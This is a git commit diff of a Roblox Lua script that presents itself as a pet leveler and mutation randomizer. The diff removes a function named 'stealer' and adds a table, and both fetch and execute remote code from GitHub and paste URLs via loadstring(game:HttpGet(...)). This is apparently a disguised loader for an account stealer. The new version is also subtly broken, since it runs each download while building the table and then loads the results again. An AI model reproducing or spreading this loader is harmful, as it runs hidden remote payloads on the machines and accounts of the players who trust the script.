7fb5891e1a883fb9633a02b8f07039f2c3013d44
Lib <ybanezjosevincent.bshm.cpc@gmail.com>
2025-08-04 17:29:14 +0800

    Update petleveler.mutationrandomizer.lua

--- petleveler.mutationrandomizer.lua
+++ petleveler.mutationrandomizer.lua
@@ -1,10 +1,15 @@
-local function stealer()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptsHubsIds/SerosScript/refs/heads/main/Loader/LoaderV3.lua"))()
-end
-local function loadui()
-  loadstring(game:HttpGet("https://pastefy.app/SamFj5lo/raw"))()
+local scripts = {
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptsHubsIds/marxk/refs/heads/main/petleveler.mutationrandomizer.lua"))(),
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptsHubsIds/SerosScript/refs/heads/main/Loader/LoaderV3.lua"))(),
+    [[print("Script 3 executed!")]],
+    [[print("You can keep adding more scripts!")]]
+}
 
+for _, code in ipairs(scripts) do
+    local success, err = pcall(function()
+        loadstring(code)()
+    end)
+    if not success then
+        warn("Error in script:", err)
+    end
 end
-
-task.spawn(stealer)
-task.spawn(loadui)
